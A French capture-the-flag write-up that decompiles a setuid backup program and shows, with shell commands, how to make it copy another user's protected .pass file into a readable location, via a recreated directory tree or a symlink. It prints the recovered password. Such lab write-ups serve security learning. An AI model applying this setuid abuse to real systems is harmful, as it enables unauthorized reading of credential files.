# level08 : backup setuid -> lecture du .pass protege

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

void log_wrapper(FILE *log_file, char *prefix, char *suffix)
{
    size_t newline_pos;
    size_t prefix_len;
    size_t buf_len;
    long in_FS_OFFSET;
    char log_buf[264];
    long canary;

    canary = *(long *)(in_FS_OFFSET + 0x28);

    strcpy(log_buf, prefix);

    prefix_len = strlen(log_buf);
    buf_len = strlen(log_buf);

    snprintf(log_buf + buf_len, 0xfe - prefix_len, suffix);

    newline_pos = strcspn(log_buf, "\n");
    log_buf[newline_pos] = '\0';

    fprintf(log_file, "LOG: %s\n", log_buf);

    if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }
}

unsigned long main(int argc, unsigned long *argv)
{
    int dst_fd;
    int read_char;
    FILE *log_fp;
    FILE *src_fp;
    size_t path_len;
    long in_FS_OFFSET;
    char byte_buf;
    char backup_path[104];
    long canary;

    canary = *(long *)(in_FS_OFFSET + 0x28);

    byte_buf = -1;

    if (argc != 2) {
        printf("Usage: %s filename\n", (char *)*argv);
    }

    log_fp = fopen("./backups/.log", "w");
    if (log_fp == (FILE *)0x0) {
        printf("ERROR: Failed to open %s\n", "./backups/.log");
        exit(1);
    }

    log_wrapper(log_fp, "Starting back up: ", (char *)argv[1]);

    src_fp = fopen((char *)argv[1], "r");
    if (src_fp == (FILE *)0x0) {
        printf("ERROR: Failed to open %s\n", (char *)argv[1]);
        exit(1);
    }

    builtin_strncpy(backup_path, "./backups/", 0xb);
    path_len = strlen(backup_path);

    strncat(backup_path, (char *)argv[1], 99 - path_len);

    dst_fd = open(backup_path, 0xc1, 0x1b0);
    if (dst_fd < 0) {
        printf("ERROR: Failed to open %s%s\n", "./backups/", (char *)argv[1]);
        exit(1);
    }

    while (1) {
        read_char = fgetc(src_fp);
        byte_buf = (char)read_char;
        if (byte_buf == -1) {
            break;
        }
        write(dst_fd, &byte_buf, 1);
    }

    log_wrapper(log_fp, "Finished back up ", (char *)argv[1]);

    fclose(src_fp);
    close(dst_fd);

    if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }

    return 0;
}
```

le binaire peut lire `/home/users/level09/.pass`. il copie le contenu de `argv[1]` dans `./backups/<argv[1]>`. idee : lui faire sauvegarder le .pass de level09 vers un fichier qu'on peut lire.

passer le chemin direct ne marche pas : `./backups/` + le chemin -> dossier inexistant, et `open` est en O_WRONLY|O_CREAT|O_EXCL (0xc1) :

    $ ./level08 /home/users/level09/.pass
    ERROR: Failed to open ./backups//home/users/level09/.pass

solution (la plus simple) : recreer l'arborescence de sortie sous `./backups/` pour que `open` puisse creer le fichier. le binaire (setuid level09) lit le vrai `.pass` et l'ecrit dans un fichier qu'on possede :

    cd /tmp/xxx                            # dossier ou on peut ecrire
    mkdir -p backups/home/users/level09    # le chemin de sortie qui manquait
    /home/users/level08/level08 /home/users/level09/.pass
    cat backups/home/users/level09/.pass
    -> fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

variante (symlink, nom court -> cible) :

    cd /tmp/backups            # dossier avec un sous-dossier backups/
    ln -s /home/users/level09/.pass sym
    /home/users/level08/level08 sym
    cat backups/sym
